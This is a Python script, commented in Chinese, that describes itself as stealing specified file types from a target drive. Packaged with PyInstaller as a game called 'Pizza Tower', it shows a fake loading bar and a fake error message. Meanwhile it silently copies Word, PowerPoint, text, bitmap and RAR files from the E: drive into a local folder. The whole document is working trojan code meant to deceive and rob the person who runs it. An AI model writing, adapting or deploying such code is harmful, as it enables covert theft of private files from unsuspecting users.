# 窃取目标盘符指定类型文件
# 打包：pyinstaller -F -w -i .\1.png .\1.py -n PizzaTower
import os
from win32 import *
from win32api import GetLogicalDriveStrings
from win32file import *
import tkinter as tk
from tkinter import ttk, messagebox
import threading
import time
import random
import sys

# 设置随机触发点
trigger_error_at = random.randint(0, 100)
# print(f"[调试] 本次将在 {trigger_error_at}% 时触发错误")

def simulate_loading():
    for i in range(101):
        time.sleep(0.05)
        progress_var.set(i)
        progress_bar.update()

        if i == trigger_error_at:
            messagebox.showerror("错误", f"运行环境异常，程序在初始化时终止。")
            root.destroy()
            return

root = tk.Tk()
root.title("Pizza Tower")
root.resizable(False, False)
# root.iconbitmap("1.ico")    # 设置图标（打包之后需要当前文件夹下有图标文件）

# 设置窗口大小并居中
window_width = 300
window_height = 100
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
x = (screen_width // 2) - (window_width // 2)
y = (screen_height // 2) - (window_height // 2)
root.geometry(f"{window_width}x{window_height}+{x}+{y}")

# 标签提示
label = ttk.Label(root, text="正在初始化，请稍候…")
label.pack(pady=10)

# 进度条
progress_var = tk.IntVar()
progress_bar = ttk.Progressbar(root, maximum=100, length=250, variable=progress_var, mode="determinate")
progress_bar.pack(pady=10)

# 启动进度线程
threading.Thread(target=simulate_loading, daemon=True).start()

root.mainloop()

# 窃取内容
U = GetLogicalDriveStrings()
U_list = U.split('\x00')
U_list.pop(-1)

# for UP in U_list:
#     if GetDriveType(UP) == 2:   # 不同盘符类型：https://learn.microsoft.com/zh-cn/windows/win32/api/fileapi/nf-fileapi-getdrivetypea
#         break
# print(f"检测到目标盘:{UP}")

path = ".\\save\\"
if not os.path.exists(path):
    os.makedirs(path)

count = 0
for root,ds,fs in os.walk("E:\\"):
    for files in fs:
        try:
            if files.lower().endswith((".docx",".bmp",".pptx",".rar",".txt")):
                file_path = root + "\\" + files    # 目标文件路径
                save_path = path + files    # 保存路径
                CopyFile(file_path, save_path ,False)
                count += 1
                # print(file_path)
        except:
            exit()
# print(f"已复制{count}个文件")

sys.exit()
